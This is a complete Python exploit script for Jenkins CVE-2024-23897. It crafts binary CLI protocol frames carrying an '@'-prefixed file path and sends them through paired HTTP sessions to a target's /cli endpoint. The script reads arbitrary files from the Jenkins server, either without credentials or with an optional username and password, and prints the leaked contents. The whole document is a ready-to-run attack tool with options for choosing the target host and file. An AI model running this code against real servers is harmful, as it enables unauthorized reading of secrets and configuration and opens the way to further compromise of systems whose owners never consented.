#!/usr/bin/env python3

import requests
from requests import Request
from struct import pack
import argparse
import socket
import threading
import base64
import uuid
import time

parser = argparse.ArgumentParser(description='Jenkins CVE-2024-23897 exploit')
parser.add_argument('--os', dest='target_os', default='linux', help='Target OS')
parser.add_argument('--host', dest='target_host', help='Target host', required=True)
parser.add_argument('--port', dest='target_port', help='Target port', default=8080)
parser.add_argument('--file', dest='target_file', help='Target file', required=True)
parser.add_argument('--user', dest='target_user', help='Target user (default: admin)', default='admin')
parser.add_argument('--pass', dest='target_pass', help='Target password')
opts = parser.parse_args()

UUID = str(uuid.uuid4())
TARGET_URL = 'http://' + opts.target_host + ':' + str(opts.target_port) + '/cli?remoting=false'

s_b64_decoded_str = None
if opts.target_pass:
  s = f'{opts.target_user}:{opts.target_pass}'
  s_bytes = s.encode('ascii')
  s_b64_encoded_bytes = base64.b64encode(s_bytes)
  s_b64_decoded_str = s_b64_encoded_bytes.decode('ascii')

# total_len + \r\n + frame_len (4 bytes) + opcode (1 byte) + data_len (2 bytes) + data (N bytes) + \r\n
# If password is provided, use `reload-job`. Else, use `help`.
if opts.target_pass:
  DATA_FRAME_1 = b'\x00\x00\x00\x0c' + b'\x00' + b'\x00\x0a' + b'\x72\x65\x6c\x6f\x61\x64\x2d\x6a\x6f\x62'
  DATA_FRAME_1_LEN_WIN = b'\x31\x31' + b'\x0d\x0a'
else:
  DATA_FRAME_1 = b'\x00\x00\x00\x06' + b'\x00' + b'\x00\x04' + b'\x68\x65\x6c\x70'
  DATA_FRAME_1_LEN_WIN = b'\x62' + b'\x0d\x0a'
# data
ARG_FILE_HEX = b'\x40' + bytes(opts.target_file, 'utf-8')
DATA_FRAME_2 = pack(">L", len(ARG_FILE_HEX) + 2) + b'\x00' + pack(">h", len(ARG_FILE_HEX)) + ARG_FILE_HEX

DATA_FRAME_2_LEN2_LIST = [i for i in hex(len(DATA_FRAME_2) - 2).replace('0x', '')]
DATA_FRAME_2_LEN_WIN = b''
for i in DATA_FRAME_2_LEN2_LIST:
  DATA_FRAME_2_LEN_WIN += i.encode('utf-8')
DATA_FRAME_2_LEN_WIN +=  b'\x0d\x0a'
# utf
# DATA_FRAME_3 = b'\x00\x00\x00\x07' + b'\x02' + b'\x00\x05' + b'\x55\x54\x46\x2d\x38' + b'\x0d\x0a'
DATA_FRAME_3 = b'\x00\x00\x00\x07' + b'\x02' + b'\x00\x05' + b'\x55\x54\x46\x2d\x38'
DATA_FRAME_3_LEN_WIN = b'\x63' + b'\x0d\x0a'
# en
## DATA_FRAME_4 = b'\x00\x00\x00\x04' + b'\x01' + b'\x00\x02' + b'\x65\x6e'+ b'\x0d\x0a'
DATA_FRAME_4 = b'\x00\x00\x00\x04' + b'\x01' + b'\x00\x02' + b'\x65\x6e'
DATA_FRAME_4_LEN_WIN = b'\x39' + b'\x0d\x0a'
# final frame - siginifies end of frame?
DATA_FRAME_5 = b'\x00\x00\x00\x00' + b'\x03'
DATA_FRAME_5_LEN_WIN = b'\x35' + b'\x0d\x0a'

s1 = requests.Session()
s2 = requests.Session()

def chunk_payload():
  yield DATA_FRAME_1
  yield DATA_FRAME_2
  yield DATA_FRAME_3
  yield DATA_FRAME_4
  yield DATA_FRAME_5
 
def upload(conn):
  HEADERS_UPLOAD = {
    'Session': UUID,
    'Side': 'upload',
    'Authorization': f'Basic {s_b64_decoded_str}',
    'User-Agent': 'Python',
    'Connection': 'keep-alive',
    'Content-Type': 'application/octet-stream'
  }

  req = Request('POST', TARGET_URL, data=chunk_payload(), headers=HEADERS_UPLOAD)
  prepped = conn.prepare_request(req)
  if not opts.target_pass:
    del prepped.headers['Authorization']
  conn.send(prepped)

def download(conn):
  HEADERS_DOWNLOAD = {
    'Session': UUID,
    'Side': 'download',
    'Authorization': f'Basic {s_b64_decoded_str}',
    'User-Agent': 'Python',
    'Connection': 'keep-alive',
    'Content-type': 'application/x-www-form-urlencoded',
    'Content-Length': '0'
  }
  req = Request('POST', TARGET_URL, headers=HEADERS_DOWNLOAD)
  prepped = conn.prepare_request(req)
  if not opts.target_pass:
    del prepped.headers['Authorization']
  data = conn.send(prepped)
  print(data.text)

t1 = threading.Thread(target=download, args=(s1,))
t1.start()

time.sleep(1)

t2 = threading.Thread(target=upload, args=(s2,))
t2.start()
